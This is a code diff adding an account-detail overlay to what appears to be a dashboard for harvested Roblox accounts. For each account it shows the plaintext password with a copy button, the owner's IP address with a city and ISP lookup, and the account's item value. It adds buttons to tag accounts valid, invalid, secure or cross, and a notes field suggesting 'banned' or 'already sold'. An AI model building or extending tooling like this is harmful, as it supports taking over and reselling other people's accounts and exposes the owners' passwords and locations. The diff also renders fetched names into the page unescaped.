@@ -205,6 +205,53 @@
     .detail-row:last-child { border-bottom: none; }
     .detail-label { color: var(--muted); flex-shrink: 0; }
     .detail-value { font-weight: 600; color: #fff; text-align: right; word-break: break-word; }
+  
+    /* Account Detail Overlay */
+    .acc-detail-overlay {
+      position: fixed; inset: 0; background: var(--bg); z-index: 999;
+      display: none; overflow-y: auto; padding: 16px;
+    }
+    .acc-detail-overlay.open { display: block; }
+    .acc-detail-inner { max-width: 520px; margin: 0 auto; display: flex; flex-direction: column; gap: 14px; padding-bottom: 32px; }
+    .ad-header { display: flex; align-items: center; justify-content: space-between; gap: 12px; }
+    .ad-profile { display: flex; align-items: center; gap: 12px; min-width: 0; }
+    .ad-avatar { width: 52px; height: 52px; border-radius: 14px; background: var(--card2); object-fit: cover; border: 1px solid var(--border); flex-shrink: 0; }
+    .ad-usn { font-size: 16px; font-weight: 700; color: var(--text); white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+    .ad-pill { display: inline-block; font-size: 11px; padding: 2px 8px; border-radius: 99px; font-weight: 600; margin-top: 4px; }
+    .ad-pill.mail { background: rgba(74, 222, 128, 0.14); color: #4ade80; border: 1px solid rgba(74, 222, 128, 0.3); }
+    .ad-pill.nomail { background: rgba(148, 163, 184, 0.12); color: var(--muted); border: 1px solid var(--border); }
+    .ad-close { width: 36px; height: 36px; border-radius: 10px; background: var(--card); border: 1px solid var(--border); color: var(--text); font-size: 16px; cursor: pointer; flex-shrink: 0; }
+    .ad-3grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 8px; }
+    .ad-stat-box { background: var(--card); border: 1px solid var(--border); border-radius: 12px; padding: 10px; text-align: center; }
+    .ad-stat-val { font-size: 14px; font-weight: 700; color: var(--cream); word-break: break-all; }
+    .ad-stat-lbl { font-size: 11px; color: var(--muted); margin-top: 2px; }
+    .ad-copy-ip { margin-top: 4px; font-size: 10px; padding: 2px 7px; border-radius: 6px; background: var(--card2); border: 1px solid var(--border); color: var(--text); cursor: pointer; }
+    .ad-loc-card { background: var(--card); border: 1px solid var(--border); border-radius: 12px; padding: 12px; }
+    .ad-loc-top { font-size: 13px; font-weight: 600; color: var(--text); }
+    .ad-loc-isp { font-size: 12px; color: var(--muted); margin-top: 4px; }
+    .ad-sec-title { font-size: 11px; font-weight: 700; letter-spacing: 0.06em; color: var(--muted); margin-bottom: 6px; display: flex; justify-content: space-between; }
+    .ad-note-area { width: 100%; min-height: 68px; background: var(--card); border: 1px solid var(--border); border-radius: 12px; padding: 10px; color: var(--text); font-size: 13px; resize: vertical; box-sizing: border-box; }
+    .ad-note-btns { display: flex; gap: 8px; margin-top: 6px; }
+    .ad-btn-save, .ad-btn-fav { flex: 1; padding: 8px; border-radius: 10px; font-size: 12px; font-weight: 600; cursor: pointer; border: 1px solid var(--border); background: var(--card); color: var(--text); }
+    .ad-btn-save { background: var(--cream); color: #111; border-color: var(--cream); }
+    .ad-btn-fav.active { border-color: #facc15; color: #facc15; }
+    .ad-hscroll { display: flex; gap: 8px; overflow-x: auto; padding-bottom: 4px; }
+    .ad-item-card { width: 92px; flex-shrink: 0; background: var(--card); border: 1px solid var(--border); border-radius: 10px; padding: 6px; text-align: center; }
+    .ad-item-thumb { width: 64px; height: 64px; object-fit: contain; border-radius: 8px; background: var(--card2); }
+    .ad-item-name { font-size: 10px; color: var(--text); margin-top: 4px; display: -webkit-box; -webkit-line-clamp: 2; -webkit-box-orient: vertical; overflow: hidden; }
+    .ad-group-list { display: flex; flex-direction: column; gap: 6px; }
+    .ad-group-row { display: flex; align-items: center; justify-content: space-between; background: var(--card); border: 1px solid var(--border); border-radius: 10px; padding: 8px 10px; gap: 8px; }
+    .ad-group-name { font-size: 12px; font-weight: 600; color: var(--text); }
+    .ad-group-meta { font-size: 11px; color: var(--muted); }
+    .ad-group-role { font-size: 11px; padding: 2px 8px; border-radius: 6px; background: var(--card2); color: var(--cream); border: 1px solid var(--border); white-space: nowrap; }
+    .ad-actions-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 8px; margin-top: 4px; }
+    .ad-act-btn { padding: 10px; border-radius: 10px; font-size: 12px; font-weight: 700; cursor: pointer; border: 1px solid var(--border); background: var(--card); color: var(--text); }
+    .ad-act-btn.primary { background: var(--cream); color: #111; border-color: var(--cream); }
+    .ad-act-btn.st-valid.on { background: rgba(74,222,128,0.18); border-color: #4ade80; color: #4ade80; }
+    .ad-act-btn.st-invalid.on { background: rgba(248,113,113,0.18); border-color: #f87171; color: #f87171; }
+    .ad-act-btn.st-secure.on { background: rgba(96,165,250,0.18); border-color: #60a5fa; color: #60a5fa; }
+    .ad-act-btn.st-cross.on { background: rgba(250,204,21,0.18); border-color: #facc15; color: #facc15; }
+
   </style>
 </head>
 <body>
@@ -420,6 +467,59 @@
   </div>
 
   <div class="toast" id="toast">Tersalin!</div>
+
+  
+  <div class="acc-detail-overlay" id="accDetailOverlay">
+    <div class="acc-detail-inner">
+      <div class="ad-header">
+        <div class="ad-profile">
+          <img class="ad-avatar" id="adAvatar" src="" alt="">
+          <div style="min-width:0;">
+            <div class="ad-usn" id="adUsn">@username</div>
+            <span class="ad-pill nomail" id="adMailPill">unverified</span>
+          </div>
+        </div>
+        <button class="ad-close" onclick="closeAccDetail()">✕</button>
+      </div>
+      <div class="ad-3grid">
+        <div class="ad-stat-box"><div class="ad-stat-val" id="adRap">0</div><div class="ad-stat-lbl">RAP</div></div>
+        <div class="ad-stat-box"><div class="ad-stat-val" id="adItemCount">0</div><div class="ad-stat-lbl">item</div></div>
+        <div class="ad-stat-box"><div class="ad-stat-val" id="adIp">-</div><div class="ad-stat-lbl">IP</div><button class="ad-copy-ip" onclick="copyAdIp()">📋 salin</button></div>
+      </div>
+      <div class="ad-loc-card">
+        <div class="ad-loc-top" id="adLocTop">📍 Unknown</div>
+        <div class="ad-loc-isp" id="adLocIsp">Memuat info ISP &amp; kota...</div>
+      </div>
+      <div>
+        <div class="ad-sec-title">CATATAN</div>
+        <textarea class="ad-note-area" id="adNoteInput" placeholder="Misal: pw salah, kena ban, sudah dijual..."></textarea>
+        <div class="ad-note-btns">
+          <button class="ad-btn-save" onclick="saveAdNote()">Simpan catatan</button>
+          <button class="ad-btn-fav" id="adFavBtn" onclick="toggleAdFav()">☆ Favorit</button>
+        </div>
+      </div>
+      <div>
+        <div class="ad-sec-title"><span>SEDANG DIPAKAI</span><span id="adWearCount" style="font-family:monospace;"></span></div>
+        <div class="ad-hscroll" id="adWearList"></div>
+      </div>
+      <div>
+        <div class="ad-sec-title"><span>BADGE ROBLOX</span><span id="adBadgeCount" style="font-family:monospace;"></span></div>
+        <div class="ad-hscroll" id="adBadgeList"></div>
+      </div>
+      <div>
+        <div class="ad-sec-title"><span>GROUP</span><span id="adGroupCount" style="font-family:monospace;"></span></div>
+        <div class="ad-group-list" id="adGroupList"></div>
+      </div>
+      <div class="ad-actions-grid">
+        <button class="ad-act-btn primary" id="adCopyUsnBtn">📋 Salin USN</button>
+        <button class="ad-act-btn" id="adCopyPwBtn">🔑 Salin PW</button>
+        <button class="ad-act-btn st-valid" id="adStValid" onclick="setAdStatus('valid')">✓ Valid</button>
+        <button class="ad-act-btn st-invalid" id="adStInvalid" onclick="setAdStatus('invalid')">✕ Invalid</button>
+        <button class="ad-act-btn st-secure" id="adStSecure" onclick="setAdStatus('secure')">🛡 Secure</button>
+        <button class="ad-act-btn st-cross" id="adStCross" onclick="setAdStatus('cross')">⚠ Cross</button>
+      </div>
+    </div>
+  </div>
 
   <script>
     let rawData = [];
@@ -873,6 +973,141 @@
     }
 
     loadAccountsData();
+  
+    // === Account Detail Module ===
+    let activeDetailUsn = null;
+    let activeDetailIp = "-";
+
+    function closeAccDetail() {
+      document.getElementById("accDetailOverlay").classList.remove("open");
+      activeDetailUsn = null;
+    }
+
+    function copyAdIp() {
+      if (!activeDetailIp || activeDetailIp === "-") return;
+      if (typeof copyText === "function") copyText(activeDetailIp, "IP disalin!");
+      else if (navigator.clipboard) navigator.clipboard.writeText(activeDetailIp);
+    }
+
+    function saveAdNote() {
+      if (!activeDetailUsn) return;
+      const notes = JSON.parse(localStorage.getItem("dyriee_notes") || "{}");
+      notes[activeDetailUsn] = document.getElementById("adNoteInput").value;
+      localStorage.setItem("dyriee_notes", JSON.stringify(notes));
+      if (typeof showToast === "function") showToast("Catatan disimpan!");
+    }
+
+    function toggleAdFav() {
+      if (!activeDetailUsn) return;
+      if (typeof toggleStar === "function") toggleStar(activeDetailUsn);
+      const isFav = !!(typeof starsMap !== "undefined" && starsMap[activeDetailUsn]);
+      const btn = document.getElementById("adFavBtn");
+      btn.classList.toggle("active", isFav);
+      btn.innerText = isFav ? "★ Favorit" : "☆ Favorit";
+    }
+
+    function refreshAdStatusButtons(usn) {
+      const st = (typeof statusMap !== "undefined" ? statusMap[usn] : null) || "active";
+      document.getElementById("adStValid").classList.toggle("on", st === "valid");
+      document.getElementById("adStInvalid").classList.toggle("on", st === "invalid");
+      document.getElementById("adStSecure").classList.toggle("on", st === "secure");
+      document.getElementById("adStCross").classList.toggle("on", st === "cross");
+    }
+
+    function setAdStatus(st) {
+      if (!activeDetailUsn) return;
+      if (typeof setStatus === "function") setStatus(activeDetailUsn, st);
+      refreshAdStatusButtons(activeDetailUsn);
+    }
+
+    async function openAccDetailByUsn(usn) {
+      const list = (typeof rawData !== "undefined" ? rawData : []);
+      const acc = list.find(a => a.usn === usn);
+      if (!acc) return;
+
+      activeDetailUsn = usn;
+      activeDetailIp = acc.ip || "-";
+
+      document.getElementById("adAvatar").src = acc.avatar || "";
+      document.getElementById("adUsn").innerText = "@" + acc.usn;
+
+      const pill = document.getElementById("adMailPill");
+      if (acc.has_verified) {
+        pill.className = "ad-pill mail";
+        pill.innerText = "verif mail";
+      } else {
+        pill.className = "ad-pill nomail";
+        pill.innerText = "unverified";
+      }
+
+      document.getElementById("adRap").innerText = Number(acc.rap || 0).toLocaleString();
+      document.getElementById("adItemCount").innerText = (acc.limitedItems || acc.limiteds || []).length;
+      document.getElementById("adIp").innerText = acc.ip || "-";
+      document.getElementById("adLocTop").innerText = "📍 " + (acc.country || "Unknown");
+      document.getElementById("adLocIsp").innerText = "Memuat detail region, kota & ISP...";
+
+      const notes = JSON.parse(localStorage.getItem("dyriee_notes") || "{}");
+      document.getElementById("adNoteInput").value = notes[usn] || "";
+
+      const isFav = !!(typeof starsMap !== "undefined" && starsMap[usn]);
+      const favBtn = document.getElementById("adFavBtn");
+      favBtn.classList.toggle("active", isFav);
+      favBtn.innerText = isFav ? "★ Favorit" : "☆ Favorit";
+
+      document.getElementById("adCopyUsnBtn").onclick = () => {
+        if (typeof copyText === "function") copyText(acc.usn, "USN disalin!");
+      };
+      document.getElementById("adCopyPwBtn").onclick = () => {
+        if (typeof copyText === "function") copyText(acc.pw, "PW disalin!");
+      };
+      refreshAdStatusButtons(usn);
+
+      document.getElementById("adWearCount").innerText = "";
+      document.getElementById("adBadgeCount").innerText = "";
+      document.getElementById("adGroupCount").innerText = "";
+      document.getElementById("adWearList").innerHTML = '<div style="font-size:12px; color:var(--muted);">Memuat item yang sedang dipakai...</div>';
+      document.getElementById("adBadgeList").innerHTML = '<div style="font-size:12px; color:var(--muted);">Memuat badge...</div>';
+      document.getElementById("adGroupList").innerHTML = '<div style="font-size:12px; color:var(--muted);">Memuat group...</div>';
+
+      document.getElementById("accDetailOverlay").classList.add("open");
+
+      try {
+        const res = await fetch("/api/detail", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ usn: acc.usn, ip: acc.ip })
+        });
+        if (!res.ok) throw new Error("HTTP " + res.status);
+        const data = await res.json();
+        if (activeDetailUsn !== usn) return;
+
+        const ipi = data.ip_info || {};
+        const locParts = [ipi.country || acc.country, ipi.region, ipi.city].filter(Boolean);
+        document.getElementById("adLocTop").innerText = "📍 " + (locParts.join(" · ") || "Unknown");
+        document.getElementById("adLocIsp").innerText = ipi.isp || "-";
+
+        const wear = data.wearing || [];
+        document.getElementById("adWearCount").innerText = wear.length + " item";
+        document.getElementById("adWearList").innerHTML = wear.length > 0
+          ? wear.map(w => `<div class="ad-item-card"><img class="ad-item-thumb" src="${w.image || ''}" alt=""><div class="ad-item-name">${w.name}</div></div>`).join("")
+          : '<div style="font-size:12px; color:var(--muted);">Tidak ada aksesoris terpasang.</div>';
+
+        const badges = data.badges || [];
+        document.getElementById("adBadgeCount").innerText = badges.length + " badge";
+        document.getElementById("adBadgeList").innerHTML = badges.length > 0
+          ? badges.map(b => `<div class="ad-item-card"><img class="ad-item-thumb" src="${b.image || ''}" alt=""><div class="ad-item-name">${b.name}</div></div>`).join("")
+          : '<div style="font-size:12px; color:var(--muted);">Tidak ada badge atau inventory private.</div>';
+
+        const groups = data.groups || [];
+        document.getElementById("adGroupCount").innerText = groups.length + " group";
+        document.getElementById("adGroupList").innerHTML = groups.length > 0
+          ? groups.map(g => `<div class="ad-group-row"><div><div class="ad-group-name">${g.name}</div><div class="ad-group-meta">${(g.members || 0).toLocaleString()} members</div></div><span class="ad-group-role">${g.role}</span></div>`).join("")
+          : '<div style="font-size:12px; color:var(--muted);">Tidak bergabung di group manapun.</div>';
+      } catch (err) {
+        document.getElementById("adLocIsp").innerText = "Gagal memuat detail tambahan.";
+      }
+    }
+
   </script>
 </body>
 </html>
